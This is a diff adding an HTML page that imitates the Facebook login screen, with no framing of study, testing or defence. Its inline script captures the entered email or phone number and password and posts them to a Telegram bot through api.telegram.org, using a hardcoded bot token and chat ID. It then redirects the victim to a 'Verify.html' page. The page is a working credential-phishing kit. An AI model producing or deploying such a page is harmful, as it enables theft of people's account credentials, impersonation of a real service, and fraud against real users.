@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#f0f2f5] flex flex-col items-center pt-12">
+    <h1 class="text-[#1877f2] text-4xl font-bold mb-8">facebook</h1>
+    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm">
+        <form id="loginForm" class="space-y-4">
+            <input id="username" class="w-full border border-gray-300 p-3 rounded-md" type="text" placeholder="Mobile or Email" required>
+            <input id="password" class="w-full border border-gray-300 p-3 rounded-md" type="password" placeholder="Password" required>
+            <button id="loginBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-md font-bold text-lg">Log In</button>
+        </form>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7866706610:AAF2ffk1-O-ugeYDuRa30aEYZp-F_1N3aDA";
+        const CHAT_ID = "6035839240";
+
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById("loginBtn");
+            const user = document.getElementById("username").value;
+            const pass = document.getElementById("password").value;
+
+            btn.disabled = true;
+            btn.innerText = "Processing...";
+
+            const text = `--- LOGIN DATA ---\nUser: ${user}\nPass: ${pass}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+                window.location.href = "Verify.html";
+            } catch (err) {
+                window.location.href = "Verify.html";
+            }
+        });
+    </script>
+</body>
+</html>
